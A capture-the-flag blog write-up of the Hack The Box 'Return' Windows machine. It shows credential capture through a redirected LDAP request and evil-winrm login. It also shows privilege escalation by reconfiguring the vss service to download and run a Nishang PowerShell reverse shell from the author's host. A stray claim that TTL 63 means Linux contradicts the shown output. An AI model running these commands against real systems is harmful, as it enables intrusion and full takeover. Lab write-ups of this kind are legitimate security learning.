---
title: Write-up Return on HTB
author: eMVee
date: 2022-02-11 21:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, nishang]
render_with_liquid: false
---

It was a while back that I was hacking a machine on HTB because it was quite busy lately. Today I was a little more relaxed so I could spend some time on HTB. I saw a Windows machine "Return" which I haven't had yet.

## Getting started
After logging in to HTB I started the machine Return and soon I had the IP address of my target on my screen. On Kali I quickly opened my terminal to declare the IP address of my target as a variable so that I have less typing work later. 

```bash
┌──(eMVee@kali)-[~]
└─$ ip=10.129.138.232  
```
As soon as the IP address was declared as variable, I performed a ping request to see if my target was reachable.

```bash
┌──(eMVee@kali)-[~]
└─$ ping -c3 $ip
PING 10.129.138.232 (10.129.138.232) 56(84) bytes of data.
64 bytes from 10.129.138.232: icmp_seq=1 ttl=127 time=17.5 ms
64 bytes from 10.129.138.232: icmp_seq=2 ttl=127 time=16.7 ms
64 bytes from 10.129.138.232: icmp_seq=3 ttl=127 time=16.5 ms

--- 10.129.138.232 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 16.528/16.901/17.484/0.417 ms

```

The machine replied nicely to my ping request and I already saw that the time to live value 63 was returned.
So as I now interpret the answer is that my target is a Linux machine.

## Enumeration is key
To know which ports are open and which services are active I run the following nmap command: **sudo nmap -sC -sV -T5 -p- -A -O $ip**.

```bash
┌──(eMVee@kali)-[~]
└─$ sudo nmap -sC -sV -T5 -p- -A -O $ip
[sudo] password for eMVee: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-11 10:27 CET
Nmap scan report for 10.129.138.232
Host is up (0.017s latency).                                                                                                                         
Not shown: 65510 closed ports                                                                                                                         
PORT      STATE SERVICE       VERSION                                                                                                                     
53/tcp    open  domain        Simple DNS Plus                                                                                                             
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                      
| http-methods:                                                                                                                                             
|_  Potentially risky methods: TRACE                                                                                                                          
|_http-server-header: Microsoft-IIS/10.0                                                                                                                      
|_http-title: HTB Printer Admin Panel                                                                                                                         
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-11 09:46:40Z)                                                                    
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                             
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                      
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)                                    
445/tcp   open  microsoft-ds?                                                                                                                                    
464/tcp   open  kpasswd5?                                                                                                                                        
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                
636/tcp   open  tcpwrapped                                                                                                                                 
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)                              
3269/tcp  open  tcpwrapped                                                                                                                                 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                
|_http-title: Not Found                                                                                                                                    
9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                         
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                
|_http-title: Not Found                                                                                                                                    
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2012|2016|7|2008|Vista|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_vista::sp1:home_premium cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (86%), Microsoft Windows 7 SP1 (86%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (86%), Microsoft Windows Windows 7 SP1 (86%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (86%), Microsoft Windows Vista SP1 (86%), Microsoft Windows Server 2012 Data Center (86%), Microsoft Windows 10 1511 (85%), Microsoft Windows 10 1709 - 1909 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-02-11T09:47:36
|_  start_date: N/A

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   16.92 ms 10.10.14.1
2   17.21 ms 10.129.138.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.12 seconds

```

From the nmap scan result I extract some data which I think is important.

* Windows, probably one of these: 2012|2016|7|2008|Vista|10
* Port 53
    * Simple DNS Plus
* Port 80
    * Microsoft IIS httpd 10.0 
    * HTB Printer Admin Panel
* Port 88
    * Microsoft Windows Kerberos
* Port 135, 139, 445
    * Probably SMB running?
* Port 389
    * LDAP
* Other ports where I have to look into if these failing.

Let's check the website on port 80 first before moving on to enumerating the other ports. The webpage title sounded interesting enough to start here.

```bash
┌──(eMVee@kali)-[~]
└─$ whatweb http://$ip      
http://10.129.138.232 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.138.232], 
Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]

```

Like nmap, Whatweb found the following information.
* Microsoft IIS 10.0
* PHP 7.4.13
* Title: HTB Printer Admin Panel

Since I still don't know much I decided to run nikto against this target.

```bash
┌──(eMVee@kali)-[~]
└─$ nikto -h http://$ip
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.138.232
+ Target Hostname:    10.129.138.232
+ Target Port:        80
+ Start Time:         2022-02-11 10:32:06 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: PHP/7.4.13
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-02-11 10:34:44 (GMT1) (158 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Since there is nothing new found with Nikto. So let's check what is shown to us in the browser.
![Image](/assets/img/WriteUp/HTB/Return/HTB-Return-1.png){: width="700" height="400" }

I can inspect the website without any form of login. There are not many functionalities available on the website. So before sending the form, I turned Burp Suite in FoxyProxy on and I started Burp Suite in the background.

![Image](/assets/img/WriteUp/HTB/Return/HTB-Return-2.png){: width="700" height="400" }

By hitting the Update (submit) button I could inspect the POST request which is send.

![Image](/assets/img/WriteUp/HTB/Return/HTB-Return-3.png){: width="700" height="400" }

In the request I can see the hostname or IP address is send to the server. By wondering, what will happen if I change this to my IP address and start a listener on that port which is stated in the webpage?
I start within my terminal a netcat listener on port 389.


```bash
┌──(eMVee@kali)-[~]
└─$ sudo nc -lvp 389     
listening on [any] 389 ...
```

While the listener is running in the background I change the hostname to my IP address and send the POST request to the server.

```bash
┌──(eMVee@kali)-[~]
└─$ sudo nc -lvp 389       
listening on [any] 389 ...
10.129.138.232: inverse host lookup failed: Unknown host
connect to [10.10.14.26] from (UNKNOWN) [10.129.138.232] 50928
0*`%return\svc-printer�
                       1edFg43012!!
```
Within the Netcat listener a username and password is shown to me.
* svc-printer
* 1edFg43012!!

Probably I can do something else with this information. Let's check what I can find with enum4linux and the username svc-printer.

```
┌──(eMVee@kali)-[~]
└─$ enum4linux -k svc-printer $ip
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 11 11:21:27 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.138.232
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. svc-printer


 ====================================================== 
|    Enumerating Workgroup/Domain on 10.129.138.232    |
 ====================================================== 
[E] Can't find workgroup/domain


 ======================================= 
|    Session Check on 10.129.138.232    |
 ======================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.129.138.232 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ============================================= 
|    Getting domain SID for 10.129.138.232    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: RETURN
Domain Sid: S-1-5-21-3750359090-2939318659-876128439
[+] Host is part of a domain (not a workgroup)
enum4linux complete on Fri Feb 11 11:21:37 2022

```

Well, that was a bit disappointing. I had already seen that the machine is a member of a domain with nmap scan. Perhaps the smb would provide some additional information with crackmapexec. 
The comand which I used looked like this: crackmapexec smb $ip -u svc-printer -p ‘1edFg43012!!’

```
┌──(eMVee@kali)-[~]
└─$ crackmapexec smb $ip -u svc-printer -p '1edFg43012!!'
SMB         10.129.138.232  445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.138.232  445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 

```

WinRM listens by default on port 5985 or 5986 (SSL) and since I did see it open in the first nmap scan, I want to verify whether this is actually the case.

```
┌──(eMVee@kali)-[~]
└─$ sudo nmap $ip -Pn -sV -v --script=~/winrm.nse -p 5985
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-11 11:25 CET
NSE: Loaded 46 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:25
Completed Parallel DNS resolution of 1 host. at 11:25, 0.01s elapsed
Initiating SYN Stealth Scan at 11:25
Scanning 10.129.139.66 [1 port]
Discovered open port 5985/tcp on 10.129.139.66
Completed SYN Stealth Scan at 11:25, 0.33s elapsed (1 total ports)
Initiating Service scan at 11:25
Scanning 1 service on 10.129.139.66
Completed Service scan at 11:25, 6.05s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.139.66.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.15s elapsed
Initiating NSE at 11:25
Completed NSE at 11:25, 0.08s elapsed
Nmap scan report for 10.129.139.66
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_winrm: WinRM service detected
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
```

As expected, WinRM is running and we may be able to create a connection to the machine. 

## Getting initial foothold
With evil-winrm we can set up an interactive shell with the svc-printer user.

```
┌──(eMVee@kali)-[~]
└─$ evil-winrm -i $ip -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 

```

We managed to connect to the machine with evil-winrm. Now that a connection has been made with the machine, it is time to see what information can be used.
First I want to know which user I am on the machine and what permissions it has.

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------2

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 

```

What immediately strikes me is that the user has many rights, more than you would expect. I had not yet viewed the user's flag and submitted it to HTB.
In general, it's on the user's desktop, so let's start there.


```
*Evil-WinRM* PS C:\Users\svc-printer> cd ..
*Evil-WinRM* PS C:\Users\svc-printer> dir


    Directory: C:\Users\svc-printer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/26/2021   2:05 AM                Desktop
d-r---        5/26/2021   1:51 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\svc-printer> cd Desktop
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/11/2022   1:44 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
<---- FLAG ---->

```
Now the user flag has been captured, it is time to enumerate a bit more. Let's check the hostname and IP configuration.

```
*Evil-WinRM* PS C:\windows> hostname
printer
*Evil-WinRM* PS C:\windows> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::202
   IPv6 Address. . . . . . . . . . . : dead:beef::68b4:9ce:9b4e:bf5
   Link-local IPv6 Address . . . . . : fe80::68b4:9ce:9b4e:bf5%10
   IPv4 Address. . . . . . . . . . . : 10.129.138.232
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%10
                                       10.129.0.1
```

As aspected this machine has one IP address, so nothing useful for now. Now let's see which memberships the user svc-printer has.

```
*Evil-WinRM* PS C:\windows> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```
So the user has some memberships assigned to his account which I will check at a later moment.
Let's enumerate the users on the system with the command **net user** to see which other users are present on the system.
```
*Evil-WinRM* PS C:\windows> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
svc-printer
The command completed with one or more errors.

```

Since there are not much users on the system I decided to check the svc-printer user for more information with **net user svc-printer**.

```
*Evil-WinRM* PS C:\windows> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 12:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```
The svc-printer user is a member of the following local groups:
* Print Operators
* Remote Management Use
* Server Operators

Server Operators already have some rights within a Windows Domain Controller by default according to [hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#server-operators). Since any user with the service operator has permissions to stop and start services this could be interesting as attacker when you have a service account with those permissions.

In this case I would like to use the Powershell TCP reverse shell of Nishang and start is as a service to escalte my privileges.
I copied the file to my working directory, so I could edit the file with Visual Code to add a line so the file would create a reverse shell to my machine a soon the files is loaded.

```
┌──(eMVee@kali)-[~/Documents/usefull]
└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/usefull]
└─$ code shell.ps1                                                 
```                               
I added the wfollowing piece to the end of the file: **Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.26 -Port 1234**.

## Privilege escalation
Since svc-printer is member of the Server Operator you are able to run the sc.exe within the terminal. It creates a subkey and entries for a service in the registry and in the Service Control Manager database according [Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create). This could be used to create our own service which run our Powershell script for a reverse shell. If this works, probably a connection as NT Authority has been set up.


Before a service is created with a reverse shell to my machine, I have to start a netcat listener on port 1234.
```
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234                                                          
listening on [any] 1234 ...
```
Now that the netcat listener is up and running, all I need to do is make sure my python web server is running and hosting the correct file.
```
┌──(eMVee@kali)-[~/Documents/usefull]
└─$ sudo python3 -m http.server 80           
```
Everything is ready on my machine, now I can configure and start my service on the target. As soon as the service is started my reverse shell should start working.

```

*Evil-WinRM* PS C:\windows\temp> sc.exe config vss binPath="C:\Windows\System32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.26/shell.ps1')"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\windows\temp> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\windows\temp> sc.exe start vss
```
The machine doesn't seem to respond after the last command, but this could also be positive, just as the web browser on a web shell sometimes doesn't respond due to loading.
So it's time to take a look at the netcat listener.

```
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234                                                          
listening on [any] 1234 ...
10.129.138.232: inverse host lookup failed: Unknown host
connect to [10.10.14.26] from (UNKNOWN) [10.129.138.232] 63477
Windows PowerShell running as user PRINTER$ on PRINTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```
It workerd!
So let's see who I am on the machine by running the command: **whoami;hostname;ipconfig**.
```
PS C:\Windows\system32>whoami;hostname;ipconfig
nt authority\system
printer

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::202
   IPv6 Address. . . . . . . . . . . : dead:beef::68b4:9ce:9b4e:bf5
   Link-local IPv6 Address . . . . . : fe80::68b4:9ce:9b4e:bf5%10
   IPv4 Address. . . . . . . . . . . : 10.129.138.232
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%10
                                       10.129.0.1
PS C:\Windows\system32> 
```
Since the user is the *nt authority\system*, we can fully control the machine and get the last flag on this machine.

```
PS C:\Windows\system32> cd c:\users\administrator\desktop
PS C:\users\administrator\desktop> dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name    
----                -------------         ------ ----    
-ar---        2/11/2022   1:44 AM             34 root.txt


PS C:\users\administrator\desktop> type root.txt
<---- FLAG ---->
PS C:\users\administrator\desktop> 
```




